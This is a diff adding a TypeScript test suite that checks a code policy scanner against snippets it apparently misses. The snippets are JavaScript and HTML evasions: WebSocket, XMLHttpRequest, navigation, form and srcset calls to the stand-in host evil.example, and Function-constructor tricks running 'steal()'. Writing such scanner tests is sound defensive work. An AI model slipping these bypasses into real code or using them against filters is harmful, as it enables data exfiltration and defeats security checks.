@@ -157,3 +157,21 @@ describe("adversary S4: the policy scan", () => {
     it(`adv_S4_policy_scan_misses: ${what}`, () => { expect(scan(kind, seed)).not.toEqual([]); });
   }
 });
+
+// Adversary, slice S4 rerun on S4-fix1 (TECHNICAL 18.2 "no eval", "no outside site"): more that passes the scan.
+describe("adversary S4 rerun: the policy scan", () => {
+  const misses: [Kind, string, string][] = [
+    ["js", 'new WebSocket("wss://evil.example/s")', "a WebSocket to an outside site (wss:, not https:)"],
+    ["js", 'new XMLHttpRequest().open("GET","https://evil.example/")', "an XMLHttpRequest to an outside site"],
+    ["js", 'location.href="https://evil.example/?"+d', "a navigation to an outside site"],
+    ["js", 'window.open("https://evil.example/")', "a window on an outside site"],
+    ["js", 'globalThis.Function("steal()")()', "globalThis.Function: a string run as code"],
+    ["js", '[].constructor.constructor("steal()")()', "the Function constructor reached by .constructor"],
+    ["js", 'el.setAttribute("src","https://evil.example/x")', "a src set by setAttribute"],
+    ["html", '<img srcset="https://evil.example/x.png 1x">', "an image srcset from an outside site"],
+    ["html", '<form action="https://evil.example/"><button>x</button></form>', "a form posting to an outside site"],
+  ];
+  for (const [kind, seed, what] of misses) {
+    it(`adv_S4_rerun_policy_scan_misses: ${what}`, () => { expect(scan(kind, seed)).not.toEqual([]); });
+  }
+});
